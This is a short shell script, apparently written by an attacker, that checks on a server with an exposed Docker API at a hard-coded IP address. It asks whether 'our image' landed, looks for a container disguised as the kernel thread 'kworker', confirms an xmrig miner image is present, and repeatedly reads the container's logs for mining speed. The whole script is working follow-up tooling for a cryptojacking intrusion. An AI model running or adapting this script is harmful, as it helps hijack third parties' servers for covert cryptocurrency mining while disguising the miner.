#!/bin/sh
# Follow-up on one host: which routes answer, did our image really land, any xmrig logs?
ip=${1:-193.36.116.120}
exec > /tmp/_big2.out 2>&1
echo "ts=$(date -u) ip=$ip"
v=$(curl -sS -m 8 "http://$ip:2375/version") || v=""
a=$(printf '%s' "$v" | grep -o '"ApiVersion": *"[0-9.]*"' | head -1 | cut -d'"' -f4)
echo "api=$a"
for base in "http://$ip:2375/v$a" "http://$ip:2375"; do
    echo "== base $base"
    echo "-- name route (first 240b):"
    curl -sS -m 8 "$base/containers/kworker/json" | head -c 240; echo
    echo "-- id route of that name:"
    curl -sS -m 8 "$base/containers/kworker/json" | grep -o '"Id": *"[0-9a-f]*"' | head -1
    echo "-- images seen: $(curl -sS -m 10 "$base/images/json" 2>/dev/null | grep -o '"RepoTags":\[[^]]*\]' | head -6 | tr '\n' ' ')"
    echo "-- image xmrig present: $(curl -sS -m 10 "$base/images/xmrig%2Fxmrig/json" 2>/dev/null | head -c 60)"
done
id=$(curl -sS -m 8 "http://$ip:2375/containers/kworker/json" 2>/dev/null | grep -o '"Id": *"[0-9a-f]*"' | head -1 | cut -d'"' -f4)
echo "id=${id:-none}"
i=0
while [ $i -lt 4 ]; do
    i=$((i + 1)); sleep 20
    echo "--- t=$((i * 20))s list: $(curl -sS -m 8 "http://$ip:2375/v$a/containers/json?all=1" 2>/dev/null | grep -o '"/[A-Za-z0-9_.-]*"' | tr '\n' ' ')"
    if [ -n "$id" ]; then
        lg=$(curl -sS -m 12 "http://$ip:2375/v$a/containers/$id/logs?stdout=1&stderr=1&tail=400" 2>/dev/null | tr -d '\000')
        echo "--- t=$((i * 20))s speed: $(printf '%s' "$lg" | grep -o 'speed [^|]*H/s' | tail -1)"
    fi
done
echo "done=$(date -u)"
